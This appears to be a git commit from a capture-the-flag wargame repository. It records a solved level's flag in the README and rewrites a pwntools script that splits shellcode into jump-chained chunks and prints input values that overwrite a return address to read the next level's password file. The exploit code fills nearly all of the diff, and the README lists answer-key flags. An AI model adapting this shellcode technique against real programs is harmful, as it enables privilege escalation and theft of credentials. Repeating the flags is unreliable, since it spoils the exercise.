92dcf6233288e22775b5b7609c3831f87e3bb37e
Sawyerf <sawyer.flink@protonmail.ch>
2021-10-21 18:52:04 +0200

    Finish: level07, Dedicace a A. !!! Woooooohhh !!!

--- README.md
+++ README.md
@@ -15,7 +15,7 @@
 | level04 | Fork No Exec    | 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN |
 | level05 | Printf Format 2 | h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq |
 | level06 | Simple Auth     | GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8 |
-| level07 |                 |  |
+| level07 | Jump Shellcode  | 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC |
 | level08 |                 |  |
 | level09 |                 |  |
 
--- level07/shellcode.py
+++ level07/shellcode.py
@@ -2,54 +2,57 @@ import pwn
 import re
 import struct
 
-# shell = pwn.shellcraft.i386.linux.cat('/home/users/level08/.pass')
-shell = pwn.shellcraft.i386.linux.echo('lol')
-# shell = pwn.shellcraft.i386.linux.cat('test')
-# shell = pwn.shellcraft.i386.linux.sh()
-shell = shell.split('\n')
-size = 0
-add = b''
-index = 1
-tt = b''
-for line in shell:
-	asm = pwn.asm(line)
-	if (size + len(asm) > 6):
-		add += b'\x90' * (6 - size)
-		add += pwn.asm('jmp $+0x6')
-		tt += add + b'\x00' * 4
-		# print(add.hex())
-		hexasm = re.findall('(.{8})', add.hex())
-		for hexa in hexasm:
-			hexa = re.findall('(.{2})', hexa)
-			hexa.reverse()
-			hexa = ''.join(hexa)
-			print('store')
-			print(int(hexa, 16))
-			print(index)
-			index += 1
-			if index % 3 == 0:
-				index += 1
-		add = b''
-		size = 0
-	add += asm
-	size += len(asm)
-if size != 0:
-	add += b'\x90' * (7 - size)
-	add += pwn.asm('ret')
-	tt += add 
-	# print(add.hex())
-	hexasm = re.findall('(.{8})', add.hex())
+def store(asm):
+	global index
+	asm += b'\x90' * (8 - len(asm))
+	# tt += add + b'\x90' * (4 + (6 - size))
+	hexasm = re.findall('(.{8})', asm.hex())
 	for hexa in hexasm:
+		hexa = re.findall('(.{2})', hexa)
+		hexa.reverse()
+		hexa = ''.join(hexa)
 		print('store')
 		print(int(hexa, 16))
 		print(index)
 		index += 1
 		if index % 3 == 0:
 			index += 1
-# print('store')
-# print(0xffffd458)
-# print(-1040108826)
+
+shell = pwn.shellcraft.i386.linux.cat('/home/users/level08/.pass')
+# shell = pwn.shellcraft.i386.linux.sh()
+shell += pwn.shellcraft.i386.linux.exit(13)
+shell = shell.split('\n')
+
+add = b''
+index = 1
+size = 0
+tt = b''
+for line in shell:
+	asm = pwn.asm(line)
+	if (size + len(asm) > 6):
+		add += pwn.asm('jmp $+' + hex(4 + (8 - size)))
+		store(add)
+		add = b''
+		size = 0
+	add += asm
+	size += len(asm)
+if size != 0:
+	# tt += add 
+	store(add)
+
+if (True):
+	# raw
+	print('store')
+	print(0xffffd478)
+	print(-1040108826)
+	print('quit')
+else:
+	# gdb
+	print('store')
+	print('4294956120')
+	print('-1040108819')
+
 # print(pwn.disasm(tt))
-print('store')
-print('4294956120')
-print('-1040108819')
+# p = pwn.run_shellcode(tt)
+# p.wait_for_close()
+# p.poll()
